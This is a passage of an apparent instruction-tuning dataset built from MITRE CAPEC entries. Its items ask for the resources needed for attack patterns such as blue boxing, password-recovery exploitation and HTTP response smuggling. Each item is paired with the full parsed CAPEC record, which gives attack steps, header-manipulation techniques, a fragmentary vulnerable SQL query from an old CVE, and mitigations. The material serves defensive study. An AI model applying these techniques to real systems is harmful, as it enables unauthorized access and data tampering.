              ],
              "Impact": [
                "Read Data",
                "Bypass Protection Mechanism"
              ]
            },
            {
              "Scope": [
                "Integrity",
                "Authorization"
              ],
              "Impact": [
                "Alter Execution Logic",
                "Hide Activities"
              ]
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Ensure network devices are storing credentials in encrypted stores",
            "Design: Follow the principle of least privilege and restrict administrative duties to as few accounts as possible. Ensure these privileged accounts are secured with strong credentials which do not overlap with other network devices.",
            "Configuration: When possible, configure network boundary devices to use MFA.",
            "Configuration: Change the default configuration for network devices to harden their security profiles. Default configurations are often enabled with insecure features to allow ease of installation and management. However, these configurations can be easily discovered and exploited by adversaries.",
            "Implementation: Perform integrity checks on audit logs for network device management and review them to identify abnormalities in configurations.",
            "Implementation: Prevent network boundary devices from being physically accessed by unauthorized personnel to prevent tampering."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": "In November 2016, a Smart Install Exploitation Tool was released online which takes advantage of Cisco\u2019s unauthenticated SMI management protocol to download a target\u2019s current configuration files. Adversaries can use this tool to overwrite files to modify the device configurations, or upload maliciously modified OS or firmware to enable persistence. Once the adversary has access to the device\u2019s configurations, they could modify it to redirect network traffic through other network infrastructure."
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1599",
            "Entry_Name": "Network Boundary Bridging"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-746"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Date": "2023-01-24"
          }
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: Local Execution of Code (CAPEC ID: 549)",
    "context": "",
    "output": "The resources required to execute Local Execution of Code (CAPEC ID: 549) are the following: The means by which the adversary intends to place the malicious code on the system dictates the tools required. For example, suppose the adversary wishes to leverage social engineering and convince a legitimate user to open a malicious file attached to a seemingly legitimate email. In this case, the adversary might require a tool capable of wrapping malicious code into an innocuous filetype (e.g., PDF, .doc, etc.)",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The means by which the adversary intends to place the malicious code on the system dictates the tools required. For example, suppose the adversary wishes to leverage social engineering and convince a legitimate user to open a malicious file attached to a seemingly legitimate email. In this case, the adversary might require a tool capable of wrapping malicious code into an innocuous filetype (e.g., PDF, .doc, etc.)",
      "@Name": "Local Execution of Code (CAPEC ID: 549)",
      "attack_ptrn": {
        "@ID": "549",
        "@Name": "Local Execution of Code",
        "@Abstraction": "Meta",
        "@Status": "Stable",
        "Description": "An adversary installs and executes malicious code on the target system in an effort to achieve a negative technical impact. Examples include rootkits, ransomware, spyware, adware, and others.",
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Prerequisites": {
          "Prerequisite": "Knowledge of the target system's vulnerabilities that can be capitalized on with malicious code.The adversary must be able to place the malicious code on the target system."
        },
        "Resources_Required": {
          "Resource": "The means by which the adversary intends to place the malicious code on the system dictates the tools required. For example, suppose the adversary wishes to leverage social engineering and convince a legitimate user to open a malicious file attached to a seemingly legitimate email. In this case, the adversary might require a tool capable of wrapping malicious code into an innocuous filetype (e.g., PDF, .doc, etc.)"
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Other",
              "Note": "Depending on the type of code executed by the adversary, the consequences of this attack pattern can vary widely."
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Employ robust cybersecurity training for all employees.",
            "Implement system antivirus software that scans all attachments before opening them.",
            "Regularly patch all software.",
            "Execute all suspicious files in a sandbox environment."
          ]
        },
        "Example_Instances": {
          "Example": "BlueBorne refers to a set of nine vulnerabilities on different platforms (Linux, Windows, Android, iOS) that offer an adversary the ability to install and execute malicious code on a system if they were close in proximity to a Bluetooth enabled device. One vulnerability affecting iOS versions 7 through 9 allowed an attacker to overflow the Low Energy Audio Protocol since commands sent over this protocol are improperly validated and gain the elevated permissions of the Bluetooth stack. These vulnerabilities were a result of poor validation and were patched shortly after their exposure in 2017, but many non-updated devices remain vulnerable."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "829"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2015-11-09"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Methods_of_Attack, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Example_Instances"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: Blue Boxing (CAPEC ID: 5)",
    "context": "",
    "output": "required resources:\nCCITT-5 or other vulnerable lines, with the ability to send tones such as combined 2,400 Hz and 2,600 Hz tones to the switch",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "CCITT-5 or other vulnerable lines, with the ability to send tones such as combined 2,400 Hz and 2,600 Hz tones to the switch",
      "@Name": "Blue Boxing (CAPEC ID: 5)",
      "attack_ptrn": {
        "@ID": "5",
        "@Name": "Blue Boxing",
        "@Abstraction": "Detailed",
        "@Status": "Obsolete",
        "Description": {
          "xhtml:p": [
            "This type of attack against older telephone switches and trunks has been around for decades. A tone is sent by an adversary to impersonate a supervisor signal which has the effect of rerouting or usurping command of the line. While the US infrastructure proper may not contain widespread vulnerabilities to this type of attack, many companies are connected globally through call centers and business process outsourcing. These international systems may be operated in countries which have not upgraded Telco infrastructure and so are vulnerable to Blue boxing. Blue boxing is a result of failure on the part of the system to enforce strong authorization for administrative functions. While the infrastructure is different than standard current applications like web applications, there are historical lessons to be learned to upgrade the access control for administrative functions.",
            {
              "xhtml:b": "This attack pattern is included in CAPEC for historical purposes."
            }
          ]
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "220"
          }
        },
        "Prerequisites": {
          "Prerequisite": "System must use weak authentication mechanisms for administrative functions."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "Given a vulnerable phone system, the attackers' technical vector relies on attacks that are well documented in cracker 'zines and have been around for decades."
          }
        },
        "Resources_Required": {
          "Resource": "CCITT-5 or other vulnerable lines, with the ability to send tones such as combined 2,400 Hz and 2,600 Hz tones to the switch"
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Availability",
              "Impact": "Resource Consumption",
              "Note": "Denial of Service"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Implementation: Upgrade phone lines. Note this may be prohibitively expensive",
            "Use strong access control such as two factor access control for administrative access to the switch"
          ]
        },
        "Example_Instances": {
          "Example": "An adversary identifies a vulnerable CCITT-5 phone line, and sends a combination tone to the switch in order to request administrative access. Based on tone and timing parameters the request is verified for access to the switch. Once the adversary has gained control of the switch launching calls, routing calls, and a whole host of opportunities are available."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "285"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-1"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2023-01-24",
              "Modification_Comment": "Updated @Status, Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Reverse Engineering (CAPEC ID: 188), tell me required resources from an attacker",
    "context": "",
    "output": "Sure. Here are the required resources the attacker should have:\nThe technical resources necessary to engage in reverse engineering differ in accordance with the type of object, resource, or system being analyzed.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The technical resources necessary to engage in reverse engineering differ in accordance with the type of object, resource, or system being analyzed.",
      "@Name": "Reverse Engineering (CAPEC ID: 188)",
      "attack_ptrn": {
        "@ID": "188",
        "@Name": "Reverse Engineering",
        "@Abstraction": "Meta",
        "@Status": "Stable",
        "Description": "An adversary discovers the structure, function, and composition of an object, resource, or system by using a variety of analysis techniques to effectively determine how the analyzed entity was constructed or operates. The goal of reverse engineering is often to duplicate the function, or a part of the function, of an object in order to duplicate or \"back engineer\" some aspect of its functioning. Reverse engineering techniques can be applied to mechanical objects, electronic devices, or software, although the methodology and techniques involved in each type of analysis differ widely.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "Low",
        "Prerequisites": {
          "Prerequisite": "Access to targeted system, resources, and information."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "Understanding of low level programming languages or technologies can be very helpful. For example, when reverse engineering a binary file, an understanding of assembly languages can help to determine the purpose and inner-workings of the code. Another example is reverse engineering an application that relies on networking. Here, an understanding networking protocols can provide insight into application details."
          }
        },
        "Resources_Required": {
          "Resource": "The technical resources necessary to engage in reverse engineering differ in accordance with the type of object, resource, or system being analyzed."
        },
        "Mitigations": {
          "Mitigation": "Employ code obfuscation techniques to prevent the adversary from reverse engineering the targeted entity."
        },
        "Example_Instances": {
          "Example": "When adversaries are reverse engineering software, methodologies fall into two broad categories, 'white box' and 'black box.' White box techniques involve methods which can be applied to a piece of software when an executable or some other compiled object can be directly subjected to analysis, revealing at least a portion of its machine instructions that can be observed upon execution. 'Black Box' methods involve interacting with the software indirectly, in the absence of the ability to measure, instrument, or analyze an executable object directly. Such analysis typically involves interacting with the software at the boundaries of where the software interfaces with a larger execution environment, such as input-output vectors, libraries, or APIs."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "1278"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-50",
            "@Section": "Reverse engineering"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Activation_Zone, Attacker_Skills_or_Knowledge_Required, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Related_Attack_Patterns, Related_Weaknesses, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Prerequisites, Description Summary, Examples-Instances, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attacker_Skills_or_Knowledge_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2023-01-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: Password Recovery Exploitation (CAPEC ID: 50)",
    "context": "",
    "output": "required resources:\nFor a brute force attack one would need a machine with sufficient CPU, RAM and HD.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "For a brute force attack one would need a machine with sufficient CPU, RAM and HD.",
      "@Name": "Password Recovery Exploitation (CAPEC ID: 50)",
      "attack_ptrn": {
        "@ID": "50",
        "@Name": "Password Recovery Exploitation",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An attacker may take advantage of the application feature to help users recover their forgotten passwords in order to gain access into the system with the same privileges as the original user. Generally password recovery schemes tend to be weak and insecure.",
        "Extended_Description": {
          "xhtml:p": "Most of them use only one security question. For instance, mother's maiden name tends to be a fairly popular one. Unfortunately in many cases this information is not very hard to find, especially if the attacker knows the legitimate user. These generic security questions are also re-used across many applications, thus making them even more insecure. An attacker could for instance overhear a coworker talking to a bank representative at the work place and supplying their mother's maiden name for verification purposes. An attacker can then try to log in into one of the victim's accounts, click on \"forgot password\" and there is a good chance that the security question there will be to provide mother's maiden name. A weak password recovery scheme totally undermines the effectiveness of a strong password scheme."
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "212",
              "Exclude_Related": {
                "@Exclude_ID": "515"
              }
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "600"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "151"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "560"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "561"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "653"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "Understand the password recovery mechanism and how it works."
            },
            {
              "Step": "2",
              "Phase": "Exploit",
              "Description": "Find a weakness in the password recovery mechanism and exploit it. For instance, a weakness may be that a standard single security question is used with an easy to determine answer."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The system allows users to recover their passwords and gain access back into the system.",
            "Password recovery mechanism has been designed or implemented insecurely.",
            "Password recovery mechanism relies only on something the user knows and not something the user has.",
            "No third party intervention is required to use the password recovery mechanism."
          ]
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Low",
              "#text": "Brute force attack"
            },
            {
              "@Level": "Medium",
              "#text": "Social engineering and more sophisticated technical attacks."
            }
          ]
        },
        "Resources_Required": {
          "Resource": "For a brute force attack one would need a machine with sufficient CPU, RAM and HD."
        },
        "Indicators": {
          "Indicator": "Many incorrect attempts to answer the security question."
        },
        "Consequences": {
          "Consequence": {
            "Scope": [
              "Confidentiality",
              "Access Control",
              "Authorization"
            ],
            "Impact": "Gain Privileges"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Use multiple security questions (e.g. have three and make the user answer two of them correctly). Let the user select their own security questions or provide them with choices of questions that are not generic.",
            "E-mail the temporary password to the registered e-mail address of the user rather than letting the user reset the password online.",
            "Ensure that your password recovery functionality is not vulnerable to an injection style attack."
          ]
        },
        "Example_Instances": {
          "Example": [
            "An attacker clicks on the \"forgot password\" and is presented with a single security question. The question is regarding the name of the first dog of the user. The system does not limit the number of attempts to provide the dog's name. An attacker goes through a list of 100 most popular dog names and finds the right name, thus getting the ability to reset the password and access the system.",
            {
              "xhtml:p": [
                "phpBanner Exchange is a PHP script (using the mySQL database) that facilitates the running of a banner exchange without extensive knowledge of PHP or mySQL.",
                "A SQL injection was discovered in the password recovery module of the system that allows recovering an arbitrary user's password and taking over their account. The problem is due to faulty input sanitization in the phpBannerExchange, specifically the e-mail address of the user which is requested by the password recovery module.",
                "The e-mail address requested by the password recovery module on the resetpw.php page. That e-mail address is validated with the following regular expression:",
                "A bug in the implementation of eregi() allows to pass additional character using a null byte \"\\0\". Since eregi() is implemented in C, the variable $email is treated as a zero-terminated string. All characters following the Null Byte will not be recognized by the regular expression. So an e-mail address can be provided that includes the special character \" ' \" to break the SQL query below (and it will not be rejected by the regular expression because of the null byte trick). So a SQL injection becomes possible:",
                "This query will return a non-zero result set even though the email supplied (attacker's email) is not in the database.",
                "Then a new password for the user is generated and sent to the $email address, an e-mail address controlled by the attacker. An attacker can then log in into the system."
              ],
              "xhtml:div": [
                {
                  "@style": "margin-left:1em;",
                  "@class": "informative",
                  "xhtml:div": {
                    "@style": "margin-left:1em;",
                    "#text": "(\\.[a-z]{2,3})$\", $email)){"
                  },
                  "#text": "if(!eregi(\"^[_a-z0-9-]+(\\.[_a-z0-9-]+)*@[a-z0-9-]+(\\.[a-z0-9-]+)*"
                },
                {
                  "@style": "margin-left:1em;",
                  "@class": "informative",
                  "xhtml:div": {
                    "@style": "margin-left:1em;",
                    "#text": "email='$email' \");"
                  },
                  "#text": "$get_info=mysql_query(\"select * from banneruser where"
                }
              ],
              "#text": "See also: CVE-2006-3013"
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "522"
            },
            {
              "@CWE_ID": "640"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-429"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Example_Instances, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Example_Instances"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: HTTP Response Smuggling (CAPEC ID: 273), tell me required resources from an attacker",
    "context": "",
    "output": "Sure. Here are the required resources the attacker should have:\nTools capable of monitoring HTTP messages, and crafting malicious HTTP messages and/or injecting malicious content into HTTP messages.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Tools capable of monitoring HTTP messages, and crafting malicious HTTP messages and/or injecting malicious content into HTTP messages.",
      "@Name": "HTTP Response Smuggling (CAPEC ID: 273)",
      "attack_ptrn": {
        "@ID": "273",
        "@Name": "HTTP Response Smuggling",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": {
          "xhtml:p": [
            "An adversary manipulates and injects malicious content in the form of secret unauthorized HTTP responses, into a single HTTP response from a vulnerable or compromised back-end HTTP agent (e.g., server).",
            "See CanPrecede relationships for possible consequences."
          ]
        },
        "Extended_Description": {
          "xhtml:p": [
            "In the maliciously manipulated HTTP response, an adversary can add duplicate header fields that HTTP agents interpret as belonging to separate responses.",
            "The combined HTTP response ends up being parsed or interpreted as two or more HTTP responses by the targeted client HTTP agent. This allows malicious HTTP responses to bypass security controls. This is performed by the abuse of interpretation and parsing discrepancies in different intermediary HTTP agents (e.g., load balancer, reverse proxy, web caching proxies, application firewalls, etc.) or client HTTP agents (e.g., web browser) in the path of the malicious HTTP responses.",
            "This attack usually involves the misuse of the HTTP headers: Content-Length and Transfer-Encoding. These abuses are discussed in RFC 2616 #4.4.3 and section #4.2 and are related to ordering and precedence of these headers. [REF-38]",
            "Additionally this attack can be performed through modification and/or fuzzing of parameters composing the request-line of HTTP messages.",
            "This attack is usually the result of the usage of outdated or incompatible HTTP protocol versions in the HTTP agents.",
            {
              "xhtml:i": "client agent (e.g., web browser)",
              "#text": "This differs from CAPEC-33 HTTP Request Smuggling, which is usually an attempt to compromise a back-end HTTP agent via HTTP Request messages. HTTP Response Smuggling is an attempt to compromise a."
            },
            "HTTP Splitting (CAPEC-105 and CAPEC-34) is different from HTTP Smuggling due to the fact that during implementation of asynchronous requests, HTTP Splitting requires the embedding/injection of arbitrary HTML headers and content through user input into browser cookies or Ajax web/browser object parameters like XMLHttpRequest."
          ]
        },
        "Alternate_Terms": {
          "Alternate_Term": {
            "Term": "HTTP Desync",
            "Description": "Modification/manipulation of HTTP message headers, request-line and body parameters to disrupt and interfere in the interpretation and parsing of HTTP message lengths/boundaries for consecutive HTTP messages by HTTP agents in a HTTP chain or network path."
          }
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "220"
            },
            {
              "@Nature": "PeerOf",
              "@CAPEC_ID": "33"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "115"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "141"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "63"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "593"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "148"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "154"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey network to identify target] The adversary performs network reconnaissance by monitoring relevant traffic to identify the network path and parsing of the HTTP messages with the goal of identifying potential targets.",
              "Technique": "Scan networks to fingerprint HTTP infrastructure and monitor HTTP traffic to identify HTTP network path with a tool such as a Network Protocol Analyzer."
            },
            {
              "Step": "1",
              "Phase": "Experiment",
              "Description": "[Identify vulnerabilities in targeted HTTP infrastructure and technologies] The adversary sends a variety of benign/ambiguous HTTP requests to observe responses from HTTP infrastructure to intended targets in order to identify differences/discrepancies in the interpretation and parsing of HTTP requests by examining supported HTTP protocol versions, message sizes, and HTTP headers."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Cause differential HTTP responses by experimenting with identified HTTP Response vulnerabilities] The adversary sends maliciously crafted HTTP request to back-end HTTP infrastructure to inject adversary data into HTTP responses (intended for intermediary and/or front-end client/victim HTTP agents communicating with back-end HTTP infrastructure) for the purpose of interfering with the parsing of HTTP response. The intended consequences of the malicious HTTP request and the subsequent adversary injection and manipulation of HTTP responses will be observed to confirm applicability of identified vulnerabilities in the adversary's plan of attack.",
              "Technique": [
                "Continue the monitoring of HTTP traffic.",
                {
                  "xhtml:p": [
                    "Inject additional HTTP headers to utilize various combinations of HTTP Headers within a single HTTP message such as: Content-Length & Transfer-Encoding (CL;TE), Transfer-Encoding & Content-Length (TE;CL), or double Transfer-Encoding (TE;TE), so that additional embedded message or data in the body of the original message are unprocessed and treated as part of subsequent messages by the intended target HTTP agent.",
                    "From these HTTP Header combinations the adversary observes any timing delays (usually in the form of HTTP 404 Error response) or any other unintended consequences."
                  ],
                  "xhtml:ul": {
                    "xhtml:li": [
                      "For CL;TE and TE;CL HTTP headers combination, the first HTTP agent, in the HTTP message path that receives the HTTP message, takes precedence or only processes the one header but not the other, while the second/final HTTP agent processes the opposite header allowing for embedded HTTP message to be ignored and smuggled to the intended target HTTP agent.",
                      "For TE;TE HTTP headers combination, all HTTP agents in HTTP message path process Transfer-Encoding header, however, adversary obfuscation of one of the Transfer-Encoding headers, by not adhering strictly to the protocol specification, can cause it to be unprocessed/ignored by a designated HTTP agent, hence allowing embedded HTTP messages to be smuggled. See Mitigations for details."
                    ]
                  }
                },
                {
                  "xhtml:p": [
                    "Construct a very large HTTP message via multiple Content-Length headers of various data lengths that can potentially cause subsequent messages to be ignored by an intermediary HTTP agent (e.g., firewall) and/or eventually parsed separately by the target HTTP agent.",
                    "Note that most modern HTTP infrastructure reject HTTP messages with multiple Content-Length headers."
                  ]
                },
                "Monitor HTTP traffic using a tool such as a Network Protocol Analyzer."
              ]
            },
            {
              "Step": "1",
              "Phase": "Exploit",
              "Description": "[Perform HTTP Response Smuggling attack] Using knowledge discovered in the experiment section above, smuggle a message to cause one of the consequences.",
              "Technique": "Leverage techniques identified in the Experiment Phase."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "A vulnerable or compromised server or domain/site capable of allowing adversary to insert/inject malicious content that will appear in the server's response to target HTTP agents (e.g., proxies and users' web browsers).",
            "Differences in the way the two HTTP agents parse and interpret HTTP responses and its headers.",
            "HTTP agents running on HTTP/1.1 that allow for Keep Alive mode, Pipelined queries, and Chunked queries and responses."
          ]
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Medium",
              "#text": "Detailed knowledge on HTTP protocol: request and response messages structure and usage of specific headers."
            },
            {
              "@Level": "Medium",
              "#text": "Detailed knowledge on how specific HTTP agents receive, send, process, interpret, and parse a variety of HTTP messages and headers."
            },
            {
              "@Level": "Medium",
              "#text": "Possess knowledge on the exact details in the discrepancies between several targeted HTTP agents in path of an HTTP message in parsing its message structure and individual headers."
            }
          ]
        },
        "Resources_Required": {
          "Resource": "Tools capable of monitoring HTTP messages, and crafting malicious HTTP messages and/or injecting malicious content into HTTP messages."
        },
        "Indicators": {
          "Indicator": "Differences in responses processed by the two agents. This requires careful monitoring or a capable log analysis tool."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: evaluate HTTP agents prior to deployment for parsing/interpretation discrepancies.",
            "Configuration: front-end HTTP agents notice ambiguous requests.",
            "Configuration: back-end HTTP agents reject ambiguous requests and close the network connection.",
            "Configuration: Disable reuse of back-end connections.",
            "Configuration: Use HTTP/2 for back-end connections.",
            "Configuration: Use the same web server software for front-end and back-end server.",
            "Implementation: Utilize a Web Application Firewall (WAF) that has built-in mitigation to detect abnormal requests/responses.",
            "Configuration: Prioritize Transfer-Encoding header over Content-Length, whenever an HTTP message contains both.",
            "Configuration: Disallow HTTP messages with both Transfer-Encoding and Content-Length or Double Content-Length Headers.",
            {
              "xhtml:ul": {
                "xhtml:li": [
                  "Headers with no space before the value \u201cchunked\u201d",
                  "Headers with extra spaces",
                  "Headers beginning with trailing characters",
                  "Headers providing a value \u201cchunk\u201d instead of \u201cchunked\u201d (the server normalizes this as chunked encoding)",
                  "Headers with multiple spaces before the value \u201cchunked\u201d",
                  "Headers with quoted values (whether single or double quotations)",
                  "Headers with CRLF characters before the value \u201cchunked\u201d",
                  "Values with invalid characters"
                ]
              },
              "#text": "Configuration: Disallow Malformed/Invalid Transfer-Encoding Headers used in obfuscation, such as:"
            },
            "Configuration: Install latest vendor security patches available for both intermediary and back-end HTTP infrastructure (i.e. proxies and web servers)",
            "Configuration: Ensure that HTTP infrastructure in the chain or network path utilize a strict uniform parsing process.",
            "Implementation: Utilize intermediary HTTP infrastructure capable of filtering and/or sanitizing user-input."
          ]
        },
        "Example_Instances": {
          "Example": [
            {
              "xhtml:p": "When using Undertow, a Java-based web server in Red Hat's Jboss Enterprise Application Platform version 7.0, the code responsible for parsing HTTP requests permitted invalid characters, that could allow the injection of data into HTTP responses from Undertow to clients when used in tandem with a proxy; allowing for web-cache poisoning, XSS, and confidentiality violation of sensitive information from other HTTP requests sent to Undertow. See also: CVE-2017-2666"
            },
            {
              "xhtml:p": "Mozilla Firefox and Thunderbird before 1.5.04, with various proxy servers, interpreted HTTP responses differently if HTTP response headers included a space between the header name and colon or if HTTP 1.1 headers were sent through a proxy configured with HTTP 1.0, allowing for HTTP Smuggling vulnerability. See also: CVE-2006-2786"
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "74"
            },
            {
              "@CWE_ID": "436"
            },
            {
              "@CWE_ID": "444"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "WASC",
            "Entry_ID": "27",
            "Entry_Name": "HTTP Response Smuggling"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-38"
            },
            {
              "@External_Reference_ID": "REF-117"
            },
            {
              "@External_Reference_ID": "REF-675"
            },
            {
              "@External_Reference_ID": "REF-676"
            },
            {
              "@External_Reference_ID": "REF-677"
            },
            {
              "@External_Reference_ID": "REF-678"
            }
          ]
        },
        "Notes": {
          "Note": [
            {
              "@Type": "Terminology",
              "#text": "HTTP Splitting \u2013 \"the act of forcing a sender of (HTTP) messages to emit data stream consisting of more messages than the sender\u2019s intension. The messages sent are 100% valid and RFC compliant\" [REF-117]."
            },
            {
              "@Type": "Terminology",
